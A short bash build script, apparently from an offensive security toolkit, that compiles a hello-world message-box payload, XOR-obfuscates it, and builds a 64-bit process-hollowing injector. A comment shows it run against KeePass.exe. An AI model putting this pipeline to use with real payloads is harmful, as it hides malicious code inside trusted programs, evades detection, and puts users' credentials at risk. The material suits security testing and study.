#!/bin/bash          
# simple example script for 64 bit process hollowing test, injecting hello world message box
# include script containing the compiler var $win64_compiler
# you can edit the compiler in build/global_win64.sh
# or enter $win64_compiler="mycompiler" here
. build/global_win64.sh
# build 32 bit hello executable
$win64_compiler -o payloads/hello.exe payloads/hello.c
strip payloads/hello.exe
# assume empty defs.h, cleanup
echo "" > defs.h
# call make_bfg, compile payload into executable
# set -x flag to use xor obfuscation
# -X flag specifies 64 bit hollowing target
./make_bfg -H payloads/hello.exe -x -X
# compile 
$win64_compiler -o bfg.exe bfg.c 
strip bfg.exe
# cleanup
echo "" > defs.h
# call like C:\> bfg "c:\Program Files (x86)\KeePass Password Safe\KeePass.exe" 
